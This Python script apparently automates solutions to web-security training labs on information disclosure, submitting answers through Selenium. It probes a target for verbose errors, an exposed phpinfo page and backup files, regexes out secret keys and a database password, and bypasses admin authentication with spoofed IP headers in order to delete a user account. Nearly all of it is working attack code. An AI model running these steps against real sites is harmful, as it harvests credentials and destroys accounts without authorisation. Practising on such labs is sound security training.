import requests 
import urllib3 
import sys 
import re
import argparse 
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def Automatically_submit(url, answer):
    
    options = webdriver.ChromeOptions().add_experimental_option('detach',True)
    driver = webdriver.Chrome(options=options)
    driver.get(url=url)
    time.sleep(1)

    submit_button = driver.find_element(By.CLASS_NAME,value='button')
    status = driver.find_element(By.XPATH,value='/html/body/div[1]/section[1]/div/div[3]/p').text
    print(f"The Status: {status}")
    submit_button.click()
    time.sleep(2)  # Wait for popup to appear

    # Handle the JavaScript prompt dialog
    try:
        alert = driver.switch_to.alert
        alert.send_keys(answer)
        time.sleep(1)  # Brief pause before accepting
        alert.accept()  # Press OK to submit
        time.sleep(2)
        status2 = driver.find_element(By.XPATH,value='/html/body/div[1]/section[1]/div/div[3]/p').text

        print(f"(+) Submited The Answer ({answer}) and pressed OK in the prompt pop-up")    
        print(f"(*) The Status: {status2}")
        if status2 == "Solved":
            print("(+) Successfully Solved The Lab.✅✅")
        else:
            pass
    except Exception as e:
        print(f"Could not interact with prompt dialog: {str(e)}")
        # Try to dismiss the dialog if it's still open
        try:
            alert = driver.switch_to.alert
            alert.dismiss()  # Press Cancel to close
            print("Dismissed the prompt dialog")
        except:
            pass
    time.sleep(3)
    driver.quit()
    



def check_Error_messages(session,url, proxies=None) : 
    vulnerable_parameter = "/product?productId='"
    Vulnerable_url = url + vulnerable_parameter

    try:
        print(f"\n================== 1-Checking for Error Message Disclosure ==================")
        print(f"Checking: {Vulnerable_url}")
        request_kwargs = {'verify': False}
        if proxies:
            request_kwargs['proxies'] = proxies
        r = session.get(Vulnerable_url, **request_kwargs)
        if r.status_code == 500 : 
            answer = r.text[-8:]
            print("The App Is Vulnerable Through Error Messages")
            print(f"The Stack Trace is: {answer}")
    # Automatically Submit The Answer
            print("Submitting The Solution.....")
            Automatically_submit(url, answer)

            sys.exit(0) 
        else: 
            print("The App Is Not be Vulnerable Through Error Messages.")
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed")
    except requests.exceptions.Timeout:
        print("[-] Timeout")
    except Exception as e:
        print(f"[-] Error: {e}")



   
def check_phpinfo(session,url, proxies=None) : 
    exposed_phpinfo_url = url + "/cgi-bin/phpinfo.php"
    print(f"\n================== 2-Checking for Exposed phpinfo.php debug page ==================")
    print(f"Checking: {exposed_phpinfo_url}")
    
    try:
        request_kwargs = {'verify': False}
        if proxies:
            request_kwargs['proxies'] = proxies
        r = session.get(exposed_phpinfo_url, **request_kwargs)
        if r.status_code == 200 : 
            print("(+) PHPInfo is Exposed..")
            print("\n(*) Searching for secrets...")
            Secret_Key = re.search( '[0-9a-z-A-Z]{32} ', r.text)
            if Secret_Key:
                context = _get_context(r.text, Secret_Key.start())
                print(f"(*) Context around the secret key:\n{context}")
                print(f"(+) The Secret Key is: {Secret_Key.group(0)[0:32]}")
                Automatically_submit(url,Secret_Key.group(0)[0:32])
                sys.exit(0) 
            else:
                print("No secret key found in phpinfo output.")
          
        else:
            print("The App Is Not be Vulnerable To Exposed phpinfo.php debug page.")
           

    except requests.exceptions.ConnectionError:
        print("[-] Connection failed")
    except requests.exceptions.Timeout:
        print("[-] Timeout")
    except Exception as e:
        print(f"[-] Error: {e}")


def check_hidden_pages(session, url, proxies=None):
    hidden_pages = ["/admin","/robots.txt", "/backup","/backup/ProductTemplate.java.bak"]
    print(f"\n================== 3-Checking_For_hidden_pages ==================")
    for page in hidden_pages:
        full_url = url + page
        try:
            print(f"Checking: {full_url}")
            request_kwargs = {'verify': False}
            if proxies:
                request_kwargs['proxies'] = proxies
            r = session.get(full_url, **request_kwargs)
            if r.status_code == 200:
                print(f"(+) Found hidden page: {full_url}")
                print(r.text[675:1000] + "...") 
                print("######" * 20) 
                if "postgres" in r.text.lower():
                    db_pass = re.search (r'"[0-9a-zA-Z]{32}"', r.text, re.IGNORECASE)
                    print(f"(+) Database Password Found: {db_pass.group(0)}") if db_pass else print("Database Password not found. ")
                    Automatically_submit(url,db_pass.group(0)[1:-1])
                    sys.exit(0)     
            else:
                print(f"(-) No access to: {full_url} (Status Code: {r.status_code})")
        
        except requests.exceptions.ConnectionError:
            print("[-] Connection failed")
        except requests.exceptions.Timeout:
            print("[-] Timeout")
        except Exception as e:
            print(f"[-] Error: {e}")


def Authentication_bypass_deleting_user(session,url, proxies=None) :
    print(f"\n================== 4-Checking For Auth Bypass Through Custom Header ==================")
    vulnerable_url = url  + "/admin" 
    delete_user_endppoint = vulnerable_url + "/delete?username=carlos"
    headers = { 
            "X-Custom-IP-Authorization" : "127.0.0.1",
            "X-Forwarded-For" : "127.0.0.1" ,
            "X-Originating-IP" : "127.0.0.1",
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
        }  
    try:
        print(f"Checking: {vulnerable_url}")
        request_kwargs = {'verify': False, 'headers': headers}
        if proxies:
            request_kwargs['proxies'] = proxies
        r = session.get(vulnerable_url, **request_kwargs)
        print(r.status_code)
        if "Admin panel" in r.text : 
            print(f"(+) Accessed to Admin Pane Successfully Through Auth Bypass Using Custom Headers (X-Custom-IP-Authorization)")
            print(f"Attempting to delete user 'carlos' Through {delete_user_endppoint}")
            
            request_kwargs2 = {'verify': False, 'headers': headers}
            if proxies:
                request_kwargs2['proxies'] = proxies
            r2 = session.get(delete_user_endppoint, **request_kwargs2)
            if "User deleted successfully" in r2.text : 
                print(f"(+) Successfully deleted user 'carlos'")
                sys.exit(0) 
            else:
                print(f"(-) Failed to delete user 'carlos'")
        else:
            print(f"(-) Could not access Admin Panel")
        

    except requests.exceptions.ConnectionError:
        print("[-] Connection failed")
    except requests.exceptions.Timeout:
        print("[-] Timeout")
    except Exception as e:
        print(f"[-] Error: {e}")


def _get_context(text: str, position: int, chars: int = 100) -> str:
    """Get context around a position in text"""
    start = max(0, position - chars)
    end = min(len(text), position + chars)
    
    return text[start:end].replace('\n', ' ').replace('\r', ' ')


def main () : 
    parser = argparse.ArgumentParser(description='Information Disclouser Scanner' ,usage=' python3 %(prog)s -u <target_url>', epilog=f'Example: python3 %(prog)s -u https://example.com -p 127.0.0.1:8080')
    parser.add_argument("-u", "--url" , help="The target URL to test (e.g., https://example.com)" , required=True)
    parser.add_argument("-p", "--proxies" , help="Use Proxies. Format: IP:PORT (default: 127.0.0.1:8080 if -p is used without value)" , nargs='?', const='127.0.0.1:8080', default=None)
    args = parser.parse_args()

    session = requests.Session() 
    url = args.url.rstrip('/')
    pattern = re.compile(
    r'^https?:\/\/'                 # http:// or https://
    r'(?:[a-zA-Z0-9-]+\.)+'          # subdomains
    r'[a-zA-Z]{2,}$'                 # top-level domain
    )
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
        print(f"[*] Assuming HTTP protocol: {url}")


    if not pattern.match(url):
        print(f"[-] Invalid URL format: {url}")
        print("[-] Please provide a valid URL (e.g., https://example.com)")
        sys.exit(1)

    logo = r"""
$$$$$$\            $$$$$$\                 $$$$$$\                                                             
\_$$  _|          $$  __$$\               $$  __$$\                                                            
  $$ |  $$$$$$$\  $$ /  \__|$$$$$$\       $$ /  \__| $$$$$$$\ $$$$$$\  $$$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  
  $$ |  $$  __$$\ $$$$\    $$  __$$\      \$$$$$$\  $$  _____|\____$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
  $$ |  $$ |  $$ |$$  _|   $$ /  $$ |      \____$$\ $$ /      $$$$$$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$ |$$ |  \__|
  $$ |  $$ |  $$ |$$ |     $$ |  $$ |     $$\   $$ |$$ |     $$  __$$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
$$$$$$\ $$ |  $$ |$$ |     \$$$$$$  |     \$$$$$$  |\$$$$$$$\\$$$$$$$ |$$ |  $$ |$$ |  $$ |\$$$$$$$\ $$ |      
\______|\__|  \__|\__|      \______/$$$$$$\\______/  \_______|\_______|\__|  \__|\__|  \__| \_______|\__|      
                                    \______|                                                                   
        Version 2.0                                                                                                     
______________________________________________________________________________________________________________"""
    print(logo)
    # Build proxies dictionary if -p argument is provided
    proxies = None
    if args.proxies:
        try:
            # Parse IP:PORT format
            if ':' in args.proxies:
                proxy_ip, proxy_port = args.proxies.rsplit(':', 1)
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                proxies = {'http': proxy_url, 'https': proxy_url}
                print(f"\n[*] Using proxies: {proxy_url}")
            else:
                print(f"[-] Invalid proxy format. Expected IP:PORT (e.g., 127.0.0.1:8080)")
                sys.exit(1)
        except Exception as e:
            print(f"[-] Error parsing proxy: {e}")
            sys.exit(1)
    else:
        print(f"\n[*] Not using proxies")
    

    check_Error_messages(session, url, proxies)
    check_phpinfo(session, url, proxies)
    check_hidden_pages(session, url, proxies)
    Authentication_bypass_deleting_user(session, url, proxies)



if __name__ == "__main__":
    try:
        main() 
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)